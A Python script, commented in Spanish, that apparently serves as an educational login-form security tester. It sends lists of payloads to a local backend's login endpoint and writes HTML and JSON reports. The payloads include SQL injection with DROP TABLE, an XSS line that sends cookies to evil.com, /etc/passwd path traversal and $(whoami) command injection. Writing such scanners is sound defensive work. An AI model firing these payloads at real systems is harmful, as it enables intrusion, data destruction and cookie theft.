import requests, json, time, datetime, os, sys

TARGET    = os.environ.get("TARGET_URL", "http://backend-1:8000")
LOGIN_URL = TARGET + "/api/auth/inicio"
REPORT_DIR = "/zap/wrk"

for d in ["/zap/wrk", "/reports", "/tmp"]:
    try:
        os.makedirs(d, exist_ok=True)
        test = os.path.join(d, ".test")
        open(test, "w").write("ok")
        os.remove(test)
    except:
        continue

if not os.access(REPORT_DIR, os.W_OK):
    REPORT_DIR = "/tmp"

print(f"\n  Guardando reportes en: {REPORT_DIR}\n")
sys.stdout.flush()

SESSION = requests.Session()
SESSION.headers.update({
    "User-Agent": "Mozilla/5.0 (SecurityTester/1.0 Educational)",
    "Accept": "application/json, text/html, */*",
})

RESULTS = []

PAYLOADS = {
    "SQL Injection": [
        ("Bypass basico",          "' OR '1'='1"),
        ("Comentar con --",        "admin'--"),
        ("OR 1=1",                 "' OR 1=1--"),
        ("Comilla simple",         "'"),
        ("Comilla doble",          '"'),
        ("UNION basico",           "' UNION SELECT null,null--"),
        ("Punto y coma",           "admin'; DROP TABLE users--"),
        ("Siempre verdadero",      "1' OR '1'='1' --"),
        ("AND false",              "' AND 1=2--"),
        ("Error based",            "' AND 1=CONVERT(int,@@version)--"),
    ],
    "XSS": [
        ("Script basico",          "<script>alert(1)</script>"),
        ("IMG onerror",            "<img src=x onerror=alert(1)>"),
        ("SVG onload",             "<svg onload=alert(1)>"),
        ("Sin tag script",         "javascript:alert(1)"),
        ("Atributo doble comilla", '" onmouseover="alert(1)'),
        ("Encoded basico",         "&lt;script&gt;alert(1)&lt;/script&gt;"),
        ("Cookie theft",           "<script>fetch('https://evil.com?c='+document.cookie)</script>"),
        ("Backtick",               "`alert(1)`"),
    ],
    "Caracteres especiales": [
        ("Null byte",              "admin\x00"),
        ("Tab",                    "admin\t' OR 1=1"),
        ("Backslash",              "admin\\"),
        ("Ampersand",              "admin&password=x"),
        ("Porcentaje",             "admin%27"),
        ("Parentesis",             "admin()"),
        ("Llaves",                 "admin{}"),
        ("Corchetes",              "admin[]"),
        ("Pipe",                   "admin | whoami"),
        ("Mayor menor",            "admin<>"),
        ("Punto punto",            "../../../etc/passwd"),
        ("Texto muy largo",        "A" * 1000),
        ("Solo espacios",          "   "),
        ("Unicode",                "admin\u2019 OR 1=1"),
    ],
    "Command Injection": [
        ("Pipe whoami",            "admin | whoami"),
        ("Ampersand cmd",          "admin & dir"),
        ("Punto y coma cmd",       "admin; ls -la"),
        ("Backtick cmd",           "admin`whoami`"),
        ("Dollar paren",           "admin$(whoami)"),
    ],
}

def test_login(category, label, username):
    result = {
        "category": category, "label": label,
        "payload_u": username, "status": None,
        "response_len": 0, "elapsed_ms": 0,
        "finding": "OK", "severity": "info", "detail": "",
    }
    try:
        start = time.time()
        resp = SESSION.post(LOGIN_URL,
            data={"username": username, "password": "cualquier_pass"},
            timeout=10, allow_redirects=True)
        elapsed = (time.time() - start) * 1000
        result["status"]       = resp.status_code
        result["response_len"] = len(resp.text)
        result["elapsed_ms"]   = round(elapsed, 1)
        body = resp.text.lower()
        if elapsed > 4000:
            result["finding"]  = "POSIBLE BLIND SQLi"
            result["severity"] = "high"
        elif any(e in body for e in ["sql","syntax error","mysql","sqlite","ora-","postgresql","unclosed"]):
            result["finding"]  = "ERROR DE BD EXPUESTO"
            result["severity"] = "critical"
        elif username in resp.text and "<script" in username.lower():
            result["finding"]  = "XSS REFLEJADO"
            result["severity"] = "critical"
        elif username in resp.text and any(c in username for c in ["<",">",'"',"'"]):
            result["finding"]  = "INPUT REFLEJADO - revisar escapado"
            result["severity"] = "medium"
            result["detail"]   = "Input aparece en la respuesta sin escapar"
        elif resp.status_code >= 500:
            result["finding"]  = "ERROR 500"
            result["severity"] = "high"
        else:
            result["finding"]  = "Rechazado correctamente"
    except requests.exceptions.Timeout:
        result["finding"]  = "TIMEOUT"
        result["severity"] = "high"
        result["elapsed_ms"] = 10000
    except Exception as e:
        result["finding"]  = "Error"
        result["detail"]   = str(e)[:80]
    return result

def run_tests():
    print(f"{'='*60}")
    print(f"  Payload Tester -- {TARGET}")
    print(f"  Inicio: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"{'='*60}\n")
    total = sum(len(v) for v in PAYLOADS.values())
    count = 0
    for category, payloads in PAYLOADS.items():
        print(f"\n  [{category}]")
        for label, payload in payloads:
            count += 1
            print(f"  ({count}/{total}) {label:<30} ", end="", flush=True)
            r = test_login(category, label, payload)
            RESULTS.append(r)
            icon = {"critical":"[!!]","high":"[!] ","medium":"[?] ","info":"[  ]"}
            print(f"{icon.get(r['severity'],'    ')} {r['finding']:<45} {r['elapsed_ms']}ms")
            time.sleep(0.3)

def generate_html(results):
    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    counts = {s: sum(1 for r in results if r["severity"]==s) for s in ["critical","high","medium","info"]}
    colors = {"critical":("#FCEBEB","#A32D2D","CRITICO"),"high":("#FAECE7","#993C1D","ALTO"),
              "medium":("#FAEEDA","#854F0B","MEDIO"),"info":("#EAF3DE","#3B6D11","INFO")}
    sorted_r = sorted(results, key=lambda r: {"critical":0,"high":1,"medium":2,"info":3}.get(r["severity"],4))
    rows = ""
    for r in sorted_r:
        bg,fg,lbl = colors.get(r["severity"],("#f5f5f5","#333","INFO"))
        p = r["payload_u"][:80].replace("<","&lt;").replace(">","&gt;")
        rows += f'<tr><td><span style="background:{bg};color:{fg};padding:2px 8px;border-radius:12px;font-size:11px;font-weight:600">{lbl}</span></td><td style="font-size:12px;color:#666">{r["category"]}</td><td>{r["label"]}</td><td style="font-family:monospace;font-size:11px;color:#c0392b;max-width:180px;word-break:break-all">{p}</td><td style="font-weight:500">{r["finding"]}</td><td style="font-size:12px;color:#666">{r["detail"]}</td><td style="text-align:right;font-size:12px">{r["elapsed_ms"]}ms</td></tr>'
    return f"""<!DOCTYPE html><html lang="es"><head><meta charset="UTF-8"><title>Payload Report</title>
<style>*{{box-sizing:border-box;margin:0;padding:0}}body{{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;background:#f8f8f6;font-size:14px}}.hdr{{background:#1a1a2e;color:white;padding:2rem 2.5rem}}.hdr h1{{font-size:22px;font-weight:500;margin-bottom:6px}}.hdr p{{font-size:13px;opacity:.7}}.stats{{display:grid;grid-template-columns:repeat(4,1fr);gap:1rem;padding:1.5rem 2.5rem;background:white;border-bottom:1px solid #eee}}.stat{{text-align:center;padding:1rem;border-radius:8px}}.stat .n{{font-size:32px;font-weight:500}}.stat .l{{font-size:12px;margin-top:4px;opacity:.8}}.sc{{background:#FCEBEB;color:#A32D2D}}.sh{{background:#FAECE7;color:#993C1D}}.sm{{background:#FAEEDA;color:#854F0B}}.si{{background:#EAF3DE;color:#3B6D11}}.content{{padding:1.5rem 2.5rem}}h2{{font-size:16px;font-weight:500;margin-bottom:1rem;color:#333}}table{{width:100%;border-collapse:collapse;background:white;border-radius:8px;overflow:hidden;box-shadow:0 1px 3px rgba(0,0,0,.08)}}th{{background:#f0f0ee;text-align:left;padding:10px 12px;font-size:11px;font-weight:600;color:#555;text-transform:uppercase;letter-spacing:.05em;border-bottom:1px solid #e0e0e0}}td{{padding:10px 12px;border-bottom:.5px solid #f0f0f0;vertical-align:top}}tr:last-child td{{border-bottom:none}}tr:hover td{{background:#fafaf8}}.footer{{text-align:center;padding:2rem;font-size:12px;color:#aaa}}</style></head><body>
<div class="hdr"><h1>Payload Security Tester - Reporte</h1><p>Target: {TARGET}/api/auth/inicio | Fecha: {now} | Total: {len(results)} payloads</p></div>
<div class="stats"><div class="stat sc"><div class="n">{counts['critical']}</div><div class="l">Critico</div></div><div class="stat sh"><div class="n">{counts['high']}</div><div class="l">Alto</div></div><div class="stat sm"><div class="n">{counts['medium']}</div><div class="l">Medio</div></div><div class="stat si"><div class="n">{counts['info']}</div><div class="l">Info/OK</div></div></div>
<div class="content"><h2>Detalle de hallazgos</h2><table><thead><tr><th>Severidad</th><th>Categoria</th><th>Prueba</th><th>Payload</th><th>Hallazgo</th><th>Detalle</th><th>Tiempo</th></tr></thead><tbody>{rows}</tbody></table></div>
<div class="footer">Payload Security Tester | Solo uso educativo</div></body></html>"""

if __name__ == "__main__":
    run_tests()

    html_path = os.path.join(REPORT_DIR, "payload-report.html")
    json_path = os.path.join(REPORT_DIR, "payload-report.json")

    with open(html_path, "w", encoding="utf-8") as f:
        f.write(generate_html(RESULTS))
    with open(json_path, "w", encoding="utf-8") as f:
        json.dump(RESULTS, f, indent=2, ensure_ascii=False)

    counts = {s: sum(1 for r in RESULTS if r["severity"]==s) for s in ["critical","high","medium","info"]}
    print(f"\n{'='*60}")
    print(f"  RESUMEN FINAL")
    print(f"{'='*60}")
    print(f"  Total payloads : {len(RESULTS)}")
    print(f"  Criticos       : {counts['critical']}")
    print(f"  Altos          : {counts['high']}")
    print(f"  Medios         : {counts['medium']}")
    print(f"  Info / OK      : {counts['info']}")
    print(f"\n  Reporte guardado en: {html_path}")
    print(f"{'='*60}\n")
    sys.stdout.flush()
